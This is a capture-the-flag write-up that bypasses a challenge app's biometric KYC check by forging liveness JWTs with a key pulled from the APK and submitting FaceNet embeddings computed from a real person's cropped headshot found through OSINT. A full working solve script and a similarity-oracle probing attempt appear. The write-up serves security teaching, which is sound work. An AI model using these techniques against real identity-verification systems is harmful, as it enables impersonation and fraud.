# KYC Me If You Can

**Challenge Name:** KYC Me If You Can
**Category:** Android
**Difficulty:** Medium-Hard
**Points:** 20
**Solved:** March 4, 2026

## Challenge Description

MobileGuard is an Android application that gates access to a flag behind a biometric face-verification pipeline. The app performs a liveness check (blink + head-turn detection), then uses a bundled FaceNet TFLite model to compute a 512-dimensional face embedding from the camera feed and submits it to a cloud backend. If the embedding is close enough to a stored target, a face token is issued and the flag is returned.

## Initial Analysis

```bash
apktool d MobileGuard.apk -o MobileGuard_decompiled
```

Key findings from Smali:

**`FaceEmbedder.smali`**:
- Input size: `0xa0` (160 × 160 px)
- Normalization: `NormalizeOp(127.5f, 128.0f)` → `(pixel − 127.5) / 128.0`
- Model asset: `assets/facenet.tflite` (512-dim output)

**`MainActivity.smali`**: the **full camera frame** (not a pre-cropped face region) is passed directly to `FaceEmbedder.getEmbedding()`.

**Hardcoded JWT signing key** in the liveness verification code:

```
MobileGuard2025_SuperSecretKey!!!
```

### API Flow

Backend at `https://2026.mhc-ctf.workers.dev/mobileguard`:

| Step | Endpoint | Input | Output |
|------|----------|-------|--------|
| 1 | `POST /api/liveness` | `session_id`, `liveness_token` (JWT HS256) | `session_hmac` |
| 2 | `POST /api/verify-face` | `session_id`, `session_hmac`, `embedding` (512 floats) | `similarity` score + `face_token` (if threshold met) |
| 3 | `POST /api/get-flag` | `session_id`, `face_token` | `flag` |

### OSINT — Identifying the Target Face

The app name and context pointed to **Mobile Hacking Lab**. Their About page lists two founders:

- **Umit Aksu** (Founder) — blank white silhouette PNG (useless for FaceNet)
- **Jelmer Hulsman** (Co-Founder/CTO) — 1440×1440 grayscale headshot

Jelmer's photo was the candidate for the stored face embedding. Using a real person's photo to bypass a KYC check is the **intended challenge design** — the authors deliberately enrolled this photo as the target, making OSINT the intended first step.

## Vulnerability Analysis

### Vulnerability 1 — JWT Forgery (Liveness Bypass)

The liveness token is HS256 signed with a key hardcoded in the APK. We can forge tokens with arbitrary claims, bypassing liveness checks entirely.

### Vulnerability 2 — FaceNet Model Bundled in APK

`facenet.tflite` is shipped inside the APK at `assets/facenet.tflite`. Extracting and running it locally lets us replicate the exact embedding the app would produce for any image — including photos of the target person found via OSINT.

### Vulnerability 3 — No Server-Side Liveness Binding

`MainActivity` passes the camera frame to `FaceEmbedder` with no server-issued nonce. A forged JWT is sufficient to submit any pre-computed embedding; there is no challenge–response binding the liveness check to an actual camera session.

## Solution

### Step 1 — Understanding the crop bypass

The full Jelmer photo (1440×1440) gave similarity **0.593** — below the verification threshold. Testing center crops reveals a non-monotonic pattern:

| Variant | Similarity | Result |
|---------|------------|--------|
| Full image (100%) | 0.593 | Fail |
| 90% center crop | 0.550 | Fail |
| **80% center crop** | **0.652** | **Pass ✓** |
| 70% center crop | 0.415 | Fail |

**Why does removing 20% of the image help?**

FaceNet was trained on tightly-aligned face crops — close-up headshots with minimal background, similar to what a front-facing phone camera captures when a face fills most of the frame. The stored embedding was almost certainly enrolled from such a well-framed crop.

The Jelmer photo is a professional headshot that includes neck, shoulders, and background. When resized to 160×160 for FaceNet, those non-face pixels pollute the embedding — shifting it away from the enrolled embedding in the 512-dimensional space.

The 80% center crop (1152×1152 px) cuts the outer shoulder/background ring while keeping the entire face, better approximating a typical enrollment crop. The 90% crop (1296px) still includes too much background. The 70% crop (1008px) goes too far — it starts clipping the chin and forehead, losing discriminative facial features. The 80% sweet spot is where background removal and face completeness balance out.

### Step 2 — The verification threshold

The endpoint returns a raw `similarity` score on every call (whether or not a `face_token` is issued):

- 0.593 → no `face_token` (fail)
- 0.652 → `face_token` issued (pass)

**The threshold lies somewhere in (0.593, 0.652).** Once we had a passing embedding there was no need to narrow it further, but it could be binary-searched by submitting linear interpolations between the failing and passing embeddings.

### Step 3 — Complete solve script

```python
#!/usr/bin/env python3
"""
MobileGuard CTF — full solve
Steps: forge liveness JWT → get session_hmac → compute face embedding → get flag
"""
import uuid, time
import numpy as np
import requests
import jwt                          # pip install PyJWT
from PIL import Image
import tensorflow as tf             # pip install tensorflow

BASE_URL        = "https://2026.mhc-ctf.workers.dev/mobileguard"
LIVENESS_SECRET = "MobileGuard2025_SuperSecretKey!!!"
MODEL_PATH      = "MobileGuard_decompiled/assets/facenet.tflite"
PHOTO_PATH      = "jelmer_hulsman.png"
CROP_FRACTION   = 0.80              # 80% center crop clears the threshold

def center_crop(img: Image.Image, fraction: float) -> Image.Image:
    w, h = img.size
    nw, nh = int(w * fraction), int(h * fraction)
    left = (w - nw) // 2
    top  = (h - nh) // 2
    return img.crop((left, top, left + nw, top + nh))

def get_embedding(img: Image.Image) -> list:
    img = img.resize((160, 160), Image.BILINEAR)
    arr = (np.array(img.convert("RGB"), dtype=np.float32) - 127.5) / 128.0
    arr = np.expand_dims(arr, 0)
    interp = tf.lite.Interpreter(model_path=MODEL_PATH)
    interp.allocate_tensors()
    inp = interp.get_input_details()
    out = interp.get_output_details()
    interp.set_tensor(inp[0]["index"], arr)
    interp.invoke()
    return interp.get_tensor(out[0]["index"])[0].tolist()

def forge_liveness_token(session_id: str) -> str:
    now = int(time.time())
    return jwt.encode(
        {"sub": "LivenessVerified", "session_id": session_id,
         "blink_passed": True, "head_turn_passed": True,
         "iat": now, "exp": now + 300},
        LIVENESS_SECRET, algorithm="HS256"
    )

def solve():
    # 1. Forge liveness token → get session_hmac
    session_id   = str(uuid.uuid4())
    liveness_tok = forge_liveness_token(session_id)
    r1 = requests.post(f"{BASE_URL}/api/liveness",
                       json={"session_id": session_id, "liveness_token": liveness_tok},
                       timeout=30)
    session_hmac = r1.json()["data"]["session_hmac"]
    print(f"[1] session_hmac: {session_hmac[:32]}...")

    # 2. Compute embedding from 80%-cropped OSINT photo
    img       = Image.open(PHOTO_PATH)
    cropped   = center_crop(img, CROP_FRACTION)
    embedding = get_embedding(cropped)
    print(f"[2] embedding computed (dim={len(embedding)}, first value={embedding[0]:.4f})")

    # 3. Submit embedding → face_token
    r2 = requests.post(f"{BASE_URL}/api/verify-face",
                       json={"session_id": session_id,
                             "session_hmac": session_hmac,
                             "embedding": embedding},
                       timeout=30)
    data2      = r2.json()["data"]
    similarity = data2.get("similarity")
    face_token = data2.get("face_token")
    print(f"[3] similarity={similarity}, face_token={'obtained' if face_token else 'NONE — threshold not met'}")
    if not face_token:
        print("    Adjust CROP_FRACTION and retry.")
        return

    # 4. Get flag
    r3   = requests.post(f"{BASE_URL}/api/get-flag",
                         json={"session_id": session_id, "face_token": face_token},
                         timeout=30)
    flag = r3.json()["data"]["flag"]
    print(f"\n[+] FLAG: {flag}")

if __name__ == "__main__":
    solve()
```

## Flag

```
MHC{d33pf4k3_kyc_pwn3d_mhl}
```

## Dead Ends

### Basis-vector oracle reconstruction

The `verify-face` endpoint leaks a raw similarity score on every call, including failures. The intuition: if the server computes cosine similarity `sim(e, r) = dot(e/|e|, r/|r|)`, then probing with each standard basis vector `e_k` (a 512-dim vector with a single 1.0 at position k) yields exactly `r_k/|r|` — one component of the normalized stored embedding. Repeating for all 512 dimensions reconstructs `r/|r|`, which submitted back should theoretically give similarity 1.0.

In practice, probing all 512 dimensions produced a reconstructed embedding with similarity **~0.38** — far below the threshold. The most likely cause is that the `session_hmac` is single-use or session-scoped: after the first `verify-face` call, reusing the same session/hmac for subsequent probes may return stale, default, or zeroed similarity values. Because contaminated measurements are indistinguishable from real low-similarity probes, the reconstructed vector ends up pointing in a mostly-wrong direction.

This is evidenced by the norm: if measurements were clean cosine-similarity probes on a unit stored vector, the reconstructed vector should have norm ≈ 1.0. The measured norm was **~1.18** — inconsistent with clean probing and consistent with measurement noise from reused sessions.

Retrying with 512 fresh forged sessions (one per dimension) was attempted in `reconstruct2.py`, but reconstruction still did not converge, suggesting additional server-side behaviour (result rounding, non-standard normalization, or a non-cosine similarity metric) that breaks the theoretical equivalence. The photo + crop approach was the correct path.

## Key Learnings

1. FaceNet embeddings are sensitive to background content — a tight center crop can meaningfully improve similarity against an enrollment done on a well-framed face
2. Hardcoded JWT signing keys in an APK are as good as public; the liveness check provides zero security when the key is extracted in seconds
3. Shipping a TFLite model in the APK gives attackers the exact inference pipeline for free — server-side inference only
4. A similarity oracle that leaks raw scores is a double-edged sword: it reveals the threshold window and enables probing attacks, even if those attacks don't fully converge here

## Tools Used

- `apktool` — APK decompilation and model extraction
- Python `PyJWT` — JWT forging
- Python `Pillow` + `tensorflow` — image preprocessing and FaceNet inference
- `requests` — API interaction

## References

- [FaceNet: A Unified Embedding for Face Recognition (Schroff et al., 2015)](https://arxiv.org/abs/1503.03832)
- [OWASP Mobile Top 10 — M1: Improper Credential Usage](https://owasp.org/www-project-mobile-top-10/)
- [PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt)
